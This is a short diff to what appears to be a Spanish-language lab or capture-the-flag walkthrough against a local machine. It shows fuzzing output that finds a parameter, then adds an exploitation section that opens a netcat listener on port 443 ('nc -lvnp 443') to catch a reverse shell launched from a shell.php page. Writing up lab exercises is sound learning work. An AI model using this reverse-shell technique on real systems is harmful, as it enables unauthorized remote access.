@@ -112,6 +112,8 @@ ID           Response   Lines    Word       Chars       Payload
 
 000115401:   200        2 L      4 W        66 Ch       "parameter"
 ```
+
+## Explotación.
 Nos ponemos en escucha por el puerto 443 y lanzamos una reverse shell desde la página **http://172.17.0.2/shell.php**
 ```bash
 nc -lvnp 443
